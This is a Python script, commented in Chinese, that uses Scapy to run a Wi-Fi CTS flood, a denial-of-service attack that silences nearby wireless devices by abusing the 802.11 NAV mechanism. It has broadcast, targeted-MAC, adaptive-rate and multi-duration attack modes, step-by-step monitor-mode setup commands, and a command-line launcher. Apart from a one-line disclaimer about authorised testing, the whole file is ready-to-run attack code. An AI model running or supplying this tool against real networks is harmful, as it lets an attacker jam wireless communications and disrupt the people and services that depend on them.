# ============================================
# CTS Flood - Scapy 实现
# 仅用于授权安全测试
# ============================================

from scapy.all import *
import sys, argparse


def cts_flood_basic(interface, duration=32767, count=0, interval=0.001):
    """
    基础 CTS Flood
    
    Parameters:
        interface: 监听模式网卡 (如 wlan0mon)
        duration:  NAV 持续时间 (μs), 最大 32767
        count:     发送次数, 0=无限
        interval:  发送间隔 (秒)
    """
    
    # 构造 CTS 帧
    # Dot11 type=1 (Control), subtype=12 (CTS)
    # addr1 = Receiver Address
    cts_frame = (
        RadioTap() /
        Dot11(
            type=1,          # Control frame
            subtype=12,      # CTS (binary: 1100)
            addr1="ff:ff:ff:ff:ff:ff",  # RA: 广播
            ID=duration      # Duration/ID 字段
        )
    )
    
    print(f"[*] CTS Flood starting on {interface}")
    print(f"[*] Duration: {duration} μs")
    print(f"[*] Interval: {interval} s")
    print(f"[*] Count: {'infinite' if count==0 else count}")
    
    sendp(cts_frame, 
          iface=interface, 
          count=count,      # 0 = infinite
          inter=interval,   # 间隔秒数
          verbose=1)


def cts_flood_targeted(interface, target_mac, duration=32767, 
                       count=0, interval=0.001):
    """
    定向 CTS Flood - RA 设为特定 MAC
    
    效果：
    - 目标 MAC 的设备收到 CTS，认为"信道分配给我了"
    - 其他设备收到 CTS，设置 NAV 静默
    - 间接阻止目标设备的通信（因为对端也在静默）
    """
    
    cts_frame = (
        RadioTap() /
        Dot11(
            type=1,
            subtype=12,
            addr1=target_mac,   # RA = 目标设备
            ID=duration
        )
    )
    
    print(f"[*] Targeted CTS Flood → {target_mac}")
    sendp(cts_frame, iface=interface, count=count, 
          inter=interval, verbose=1)


def cts_flood_adaptive(interface, duration=32767):
    """
    自适应 CTS Flood
    - 动态调整发送速率
    - 根据 Duration 值计算最优间隔
    """
    
    # Duration = 32767μs ≈ 32.767ms
    # 理论上每 32.767ms 发一个就够了
    # 但考虑到部分设备 NAV 处理延迟，加快 2-3 倍
    
    optimal_interval = (duration / 1000000.0) / 3  # 除以3倍冗余
    
    cts_frame = (
        RadioTap() /
        Dot11(type=1, subtype=12,
              addr1="ff:ff:ff:ff:ff:ff",
              ID=duration)
    )
    
    print(f"[*] Adaptive CTS Flood")
    print(f"[*] Optimal interval: {optimal_interval*1000:.2f} ms")
    
    sendp(cts_frame, iface=interface, count=0, 
          inter=optimal_interval, verbose=1)


def cts_flood_multi_duration(interface, count=0, interval=0.001):
    """
    多 Duration 值 CTS Flood
    - 交替发送不同 Duration 值
    - 增加目标设备 NAV 处理的混乱
    """
    
    durations = [32767, 30000, 25000, 20000, 15000]
    frames = []
    
    for dur in durations:
        frame = (
            RadioTap() /
            Dot11(type=1, subtype=12,
                  addr1="ff:ff:ff:ff:ff:ff",
                  ID=dur)
        )
        frames.append(frame)
    
    print(f"[*] Multi-Duration CTS Flood")
    print(f"[*] Durations: {durations}")
    
    # 循环发送不同 duration 的 CTS
    while True:
        for frame in frames:
            sendp(frame, iface=interface, count=1, 
                  inter=0, verbose=0)
            time.sleep(interval)


# ============================================
# 使用前的准备工作
# ============================================
#
# 1. 将网卡设为监听模式：
#    sudo airmon-ng start wlan0
#    或
#    sudo ip link set wlan0 down
#    sudo iw wlan0 set type monitor
#    sudo ip link set wlan0 up
#
# 2. 设置信道（必须和目标在同一信道）：
#    sudo iw wlan0mon set channel 6
#    或
#    sudo iwconfig wlan0mon channel 6
#
# 3. 运行：
#    sudo python3 cts_flood.py -i wlan0mon
#
# ============================================


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", required=True,
                        help="Monitor mode interface")
    parser.add_argument("-t", "--target", default="ff:ff:ff:ff:ff:ff",
                        help="Target MAC (default: broadcast)")
    parser.add_argument("-d", "--duration", type=int, default=32767,
                        help="NAV duration in μs (max: 32767)")
    parser.add_argument("-c", "--count", type=int, default=0,
                        help="Packet count (0=infinite)")
    parser.add_argument("--interval", type=float, default=0.001,
                        help="Send interval in seconds")
    parser.add_argument("-m", "--mode", 
                        choices=["basic","targeted","adaptive","multi"],
                        default="basic",
                        help="Attack mode")
    
    args = parser.parse_args()
    
    if args.mode == "basic":
        cts_flood_basic(args.interface, args.duration, 
                       args.count, args.interval)
    elif args.mode == "targeted":
        cts_flood_targeted(args.interface, args.target,
                          args.duration, args.count, args.interval)
    elif args.mode == "adaptive":
        cts_flood_adaptive(args.interface, args.duration)
    elif args.mode == "multi":
        cts_flood_multi_duration(args.interface, args.count, 
                                args.interval)
